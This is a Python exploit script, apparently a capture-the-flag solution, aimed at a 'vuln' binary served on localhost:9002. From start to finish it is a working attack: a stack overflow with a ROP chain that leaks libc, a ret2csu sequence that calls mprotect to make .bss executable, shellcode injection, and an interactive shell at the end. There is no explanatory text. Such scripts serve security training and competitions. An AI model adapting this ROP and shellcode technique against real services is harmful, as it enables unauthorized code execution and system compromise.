from ptrlib import *

elf = ELF("../distfiles/vuln")
libc = ELF("../distfiles/libc-2.31.so")
#sock = Process("./vuln", env={'LD_PRELOAD': './libsandbox.so'})
sock = Socket("localhost", 9002)

addr_pmprotect = elf.section('.bss') + 0x200
addr_pread = elf.section('.bss') + 0x210
addr_shellcode = elf.section('.bss') + 0x300
rop_ret = 0x00401274
rop_pop_rdi = 0x00401273
rop_csu_popper = 0x40126a
rop_csu_caller = 0x401250
rop_pop_rbx_rbp_r12_r13_r14_r15 = 0x0040126a
rop_add_prbpM3Dh_ebx = 0x004011ec

# leak libc base
payload  = b'A'*0x48
payload += flat([
    # puts(puts)
    rop_pop_rdi, elf.got('puts'),
    elf.plt('puts'),
    # start()
    elf.symbol('_start') + 4 # avoid whitespace
], map=p64)
assert not has_space(payload)
sock.sendlineafter("feedback: \n", payload)
sock.recvline()
libc_base = u64(sock.recvline()) - libc.symbol('puts')
logger.info("libc = " + hex(libc_base))
libc.set_base(libc_base)

# inject shellcode
payload  = b'A'*0x48
payload += flat([
    # *addr_pmprotect = mprotect
    rop_pop_rbx_rbp_r12_r13_r14_r15,
    libc.symbol('mprotect') & 0xffffffff, addr_pmprotect+0x3d, 2, 3, 4, 5,
    rop_add_prbpM3Dh_ebx,
    rop_pop_rbx_rbp_r12_r13_r14_r15,
    libc.symbol('mprotect') >> 32, addr_pmprotect+0x3d+4, 2, 3, 4, 5,
    rop_add_prbpM3Dh_ebx,
    # *addr_pread = read
    rop_pop_rbx_rbp_r12_r13_r14_r15,
    libc.symbol('read') & 0xffffffff, addr_pread+0x3d, 2, 3, 4, 5,
    rop_add_prbpM3Dh_ebx,
    rop_pop_rbx_rbp_r12_r13_r14_r15,
    libc.symbol('read') >> 32, addr_pread+0x3d+4, 2, 3, 4, 5,
    rop_add_prbpM3Dh_ebx,
    # mprotect(addr_shellcode & ~0xfff, 0x1000, 7)
    rop_csu_popper,
    0, 1, addr_shellcode & 0xfffffffffffff000, 0x1000, 7, addr_pmprotect,
    rop_csu_caller, 0xdeadbeef,
    0, 1, 0, addr_shellcode, 0x400, addr_pread,
    rop_csu_caller, 0xdeadbeef,
    0, 1, 2, 3, 4, 5,
    # shellcode()
    addr_shellcode
], map=p64)
assert not has_space(payload)
sock.sendlineafter("feedback: \n", payload)

# execute shellcode
shellcode = nasm(open("shellcode.S", "r").read(), bits=64)
shellcode = shellcode.replace(
    p64(0xdeaddeaddeaddead), p64(libc_base + 0x1ed608)
).replace(
    p64(0xcafecafecafecafe), p64(libc_base + 0xe6c7e)
)
sock.send(shellcode)

sock.interactive()
